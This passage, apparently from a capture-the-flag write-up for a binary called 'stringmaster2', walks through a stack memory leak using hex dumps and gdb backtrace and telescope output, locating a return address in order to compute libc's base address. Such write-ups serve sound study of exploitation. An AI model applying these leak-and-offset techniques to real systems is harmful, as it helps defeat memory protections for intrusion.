00000100  00 00 00 00  00 00 00 00  68 83 52 ae  ff 7f 00 00  │····│····│h·R·│····│
00000110  70 01 d0 5c  7b 7f 00 00  d6 61 ce 5c  7b 7f 00 00  │p··\│{···│·a·\│{···│
00000120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000130  00 00 00 00  00 00 00 00  30 32 d7 72  61 55 00 00  │····│····│02·r│aU··│
00000140  50 83 52 ae  ff 7f 00 00  5a 32 d7 72  61 55 00 00  │P·R·│····│Z2·r│aU··│
00000150  48 83 52 ae  ff 7f 00 00  1c 00 00 00  00 00 00 00  │H·R·│····│····│····│
00000160  01 00 00 00  00 00 00 00  05 98 52 ae  ff 7f 00 00  │····│····│··R·│····│
00000170  00 00 00 00  00 00 00 00  15 98 52 ae  ff 7f 00 00  │····│····│··R·│····│
00000180  20 98 52 ae  ff 7f 00 00  34 98 52 ae  ff 7f 00 00  │ ·R·│····│4·R·│····│
00000190  44 98 52 ae  ff 7f 00 00  60 98 52 ae  ff 7f 00 00  │D·R·│····│`·R·│····│
000001a0  72 98 52 ae  ff 7f 00 00  7a 98 52 ae  ff 7f 00 00  │r·R·│····│z·R·│····│
000001b0  8d 98 52 ae  ff 7f 00 00  a3 98 52 ae  ff 7f 00 00  │··R·│····│··R·│····│
000001c0  8f 9e 52 ae  ff 7f 00 00  b8 9e 52 ae  ff 7f 00 00  │··R·│····│··R·│····│
000001d0  c9 9e 52 ae  ff 7f 00 00  ea 9e 52 ae  ff 7f 00 00  │··R·│····│··R·│····│
000001e0  f7 9e 52 ae  ff 7f 00 00  01 9f 52 ae  ff 7f 00 00  │··R·│····│··R·│····│
000001f0  15 9f 52 ae  ff 7f 00 00  64 9f 52 ae  ff 7f 00 00  │··R·│····│d·R·│····│
00000200  98 9f 52 ae  ff 7f 00 00  a3 9f 52 ae  ff 7f 00 00  │··R·│····│··R·│····│
00000210  d6 9f 52 ae  ff 7f 00 00  00 00 00 00  00 00 00 00  │··R·│····│····│····│
00000220  21 00 00 00  00 00 00 00  00 a0 53 ae  ff 7f 00 00  │!···│····│··S·│····│
00000230  10 00 00 00  00 00 00 00  ff fb 8b 07  00 00 00 00  │····│····│····│····│
00000240  06 00 00 00  00 00 00 00  00 10 00 00  00 00 00 00  │····│····│····│····│
00000250  11 00 00 00  00 00 00 00  64 00 00 00  00 00 00 00  │····│····│d···│····│
00000260  03 00 00 00  00 00 00 00  40 20 d7 72  61 55 00 00  │····│····│@ ·r│aU··│
00000270  04 00 00 00  00 00 00 00  38 00 00 00  00 00 00 00  │····│····│8···│····│
00000280  05 00 00 00  00 00 00 00  09 00 00 00  00 00 00 00  │····│····│····│····│
00000290  07 00 00 00  00 00 00 00  00 70 cd 5c  7b 7f 00 00  │····│····│·p·\│{···│
000002a0  08 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
000002b0  09 00 00 00  00 00 00 00  30 32 d7 72  61 55 00 00  │····│····│02·r│aU··│
000002c0  0b 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
000002d0  0c 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
000002e0  0d 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
000002f0  0e 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000300  17 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000310  19 00 00 00  00 00 00 00  59 85 52 ae  ff 7f 00 00  │····│····│Y·R·│····│
00000320  1a 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000330  1f 00 00 00  00 00 00 00  e8 9f 52 ae  ff 7f 00 00  │····│····│··R·│····│
00000340  0f 00 00 00  00 00 00 00  69 85 52 ae  ff 7f 00 00  │····│····│i·R·│····│
00000350  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000360  00 00 00 00  00 00 00 00  00 7a e7 34  58 46 e4 34  │····│····│·z·4│XF·4│
00000370  8e 01 bc 59  a6 75 b6 9c  44 78 38 36  5f 36 34 00  │···Y│·u··│Dx86│_64·│
00000380  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000400
```
We attach to the process using `gdb --pid 1374`. Now we can inspect the backtrace:
```
gdb-peda$ bt
#0  0x00007f7b5ca4f1d1 in __GI___libc_read (fd=0x0, buf=0x556173ecb2b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:27
#1  0x00007f7b5c9e1838 in _IO_new_file_underflow (fp=0x7f7b5cb1da00 ) at fileops.c:531
#2  0x00007f7b5c9e2972 in __GI__IO_default_uflow (fp=0x7f7b5cb1da00 ) at genops.c:380
#3  0x00007f7b5cc2645d in __gnu_cxx::stdio_sync_filebuf >::underflow() () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#4  0x00007f7b5cc33d2a in std::istream::sentry::sentry(std::istream&, bool) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#5  0x00007f7b5cbe7e03 in std::basic_istream >& std::operator>>, std::allocator >(std::basic_istream >&, std::__cxx11::basic_string, std::allocator >&) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#6  0x0000556172d73e35 in play() ()
#7  0x0000556172d745fb in main ()
#8  0x00007f7b5c988b17 in __libc_start_main (main=0x556172d745e1 , argc=0x1, argv=0x7fffae528358, init=, fini=, rtld_fini=, stack_end=0x7fffae528348) at ../csu/libc-start.c:310
#9  0x0000556172d7325a in _start ()
```
Let's try to find the location of the following return address in the stack dump:
```
#7  0x0000556172d745fb in main ()
```
We can see it's at offset 0x78:
```
00000070  00 00 00 00  00 00 00 00  fb 45 d7 72  61 55 00 00  │····│····│·E·r│aU··│
```
Now we need to leak some runtime LibC address in order to calculate the runtime base address of LibC.
We inspect the stack using `telescope`:
```
gdb-peda$ telescope $rsp 100
0000| 0x7fffae528078 --> 0x7f7b5c9e1838 (:  test   rax,rax)
0008| 0x7fffae528080 --> 0x7f7b5cb1da00 --> 0xfbad2088
0016| 0x7fffae528088 --> 0x7f7b5cb1a2a0 --> 0x0
0024| 0x7fffae528090 --> 0x7fffae528137 --> 0x7f7b5ccbf08000
0032| 0x7fffae528098 --> 0x7f7b5ccbf080 --> 0x7f7b5ccb47b0 (:ctype+16>:   0x00007f7b5cbf4250)
0040| 0x7fffae5280a0 --> 0x7fffae528194 --> 0x6200000062 ('b')
0048| 0x7fffae5280a8 --> 0x7f7b5c9e2972 (:   cmp    eax,0xffffffff)
0056| 0x7fffae5280b0 --> 0x7f7b5cb1a2a0 --> 0x0
0064| 0x7fffae5280b8 --> 0x7f7b5ccbd6a0 --> 0x7f7b5ccb7058 (:stdio_sync_filebuf >+16>:     0x00007f7b5cc26390)
0072| 0x7fffae5280c0 --> 0x7f7b5ccbd6a0 --> 0x7f7b5ccb7058 (:stdio_sync_filebuf >+16>:     0x00007f7b5cc26390)
0080| 0x7fffae5280c8 --> 0x7f7b5cc2645d ( >::underflow()+13>:        mov    rsi,QWORD PTR [rbx+0x40])
0088| 0x7fffae5280d0 --> 0x556172f75140 (:cin@@GLIBCXX_3.4>:    0x00007f7b5ccb7ec0)
0096| 0x7fffae5280d8 --> 0x7f7b5cc33d2a (:       cmp    eax,0xffffffff)
0104| 0x7fffae5280e0 --> 0x7fffae528120 --> 0x556172f75001 --> 0x800000000000000
0112| 0x7fffae5280e8 --> 0x7fffae528200 --> 0x7fffae528210 --> 0x6500746e697200 ('')
0120| 0x7fffae5280f0 --> 0x2
0128| 0x7fffae5280f8 --> 0x7fffae528200 --> 0x7fffae528210 --> 0x6500746e697200 ('')
0136| 0x7fffae528100 --> 0x556172f75020 (:cout@@GLIBCXX_3.4>:   0x00007f7b5ccb8960)
0144| 0x7fffae528108 --> 0x7f7b5cbe7e03 ( >& std::operator>>, std::allocator >(std::basic_istream >&, std::__cxx11::basic_string, std::allocator >&)+35>:    cmp    BYTE PTR [rsp+0x27],0x0)
0152| 0x7fffae528110 --> 0x7f7b5cb1e760 --> 0xfbad2aa4
0160| 0x7fffae528118 --> 0x7f7b5c9e1af3 (:   cmp    eax,0xffffffff)
0168| 0x7fffae528120 --> 0x556172f75001 --> 0x800000000000000
0176| 0x7fffae528128 --> 0x556172f75020 (:cout@@GLIBCXX_3.4>:   0x00007f7b5ccb8960)
0184| 0x7fffae528130 --> 0x7f7b5cb1a2a0 --> 0x0
0192| 0x7fffae528138 --> 0x7f7b5ccbf080 --> 0x7f7b5ccb47b0 (:ctype+16>:   0x00007f7b5cbf4250)
--More--(25/100)
0200| 0x7fffae528140 --> 0x2
0208| 0x7fffae528148 --> 0x7fffae528200 --> 0x7fffae528210 --> 0x6500746e697200 ('')
0216| 0x7fffae528150 --> 0x2
0224| 0x7fffae528158 --> 0x620000000000000a ('\n')
0232| 0x7fffae528160 --> 0x556172f75020 (:cout@@GLIBCXX_3.4>:   0x00007f7b5ccb8960)
0240| 0x7fffae528168 --> 0x7fffae528194 --> 0x6200000062 ('b')
0248| 0x7fffae528170 --> 0x7fffae528198 --> 0x62 ('b')
0256| 0x7fffae528178 --> 0x556172d73e35 (: lea    rsi,[rip+0xbeb]        # 0x556172d74a27)
0264| 0x7fffae528180 --> 0xffffffffffffffff
0272| 0x7fffae528188 --> 0x7fffae5281e0 --> 0x7fffae5281f0 ("eluamegqwh")
0280| 0x7fffae528190 --> 0x6262620000 ('')
0288| 0x7fffae528198 --> 0x62 ('b')
0296| 0x7fffae5281a0 --> 0x7fffae5281b0 ("eluamegqwh")
0304| 0x7fffae5281a8 --> 0xa ('\n')
0312| 0x7fffae5281b0 ("eluamegqwh")
0320| 0x7fffae5281b8 --> 0x6877 ('wh')
0328| 0x7fffae5281c0 --> 0x7fffae5281d0 ("orefrjsvxx")
0336| 0x7fffae5281c8 --> 0xa ('\n')
0344| 0x7fffae5281d0 ("orefrjsvxx")
0352| 0x7fffae5281d8 --> 0x7f7b5c007878
0360| 0x7fffae5281e0 --> 0x7fffae5281f0 ("eluamegqwh")
0368| 0x7fffae5281e8 --> 0x620000000000000a ('\n')
0376| 0x7fffae5281f0 ("eluamegqwh")
0384| 0x7fffae5281f8 --> 0x6877 ('wh')
0392| 0x7fffae528200 --> 0x7fffae528210 --> 0x6500746e697200 ('')
--More--(50/100)
0400| 0x7fffae528208 --> 0x0
0408| 0x7fffae528210 --> 0x6500746e697200 ('')
0416| 0x7fffae528218 --> 0x556172d74671 (:  mov    rax,QWORD PTR [rsp+0x8])
0424| 0x7fffae528220 --> 0xffffffffffffff90
0432| 0x7fffae528228 --> 0x8e34e4465834e700
0440| 0x7fffae528230 --> 0x2
0448| 0x7fffae528238 --> 0x0
0456| 0x7fffae528240 --> 0x556172d74690 (:     push   r15)
0464| 0x7fffae528248 --> 0x556172d73230 (:      xor    ebp,ebp)
0472| 0x7fffae528250 --> 0x7fffae528350 --> 0x1
0480| 0x7fffae528258 --> 0x0
0488| 0x7fffae528260 --> 0x0
0496| 0x7fffae528268 --> 0x556172d745fb (:     mov    eax,0x0)
0504| 0x7fffae528270 --> 0x0
0512| 0x7fffae528278 --> 0x7f7b5c988b17 (:       mov    edi,eax)
0520| 0x7fffae528280 --> 0x7fffae528368 --> 0x7fffae529815 ("LANG=en_IL")
0528| 0x7fffae528288 --> 0x7fffae528358 --> 0x7fffae529805 ("./stringmaster2")
0536| 0x7fffae528290 --> 0x15cbf89b0
0544| 0x7fffae528298 --> 0x556172d745e1 (:        sub    rsp,0x8)
0552| 0x7fffae5282a0 --> 0x0
0560| 0x7fffae5282a8 --> 0xc629a91df5228939
0568| 0x7fffae5282b0 --> 0x556172d73230 (:      xor    ebp,ebp)
```
It looks like our stack leak starts at:
```
0376| 0x7fffae5281f0 ("eluamegqwh")
```
A few lines later, we see the return address from offset 0x78:
```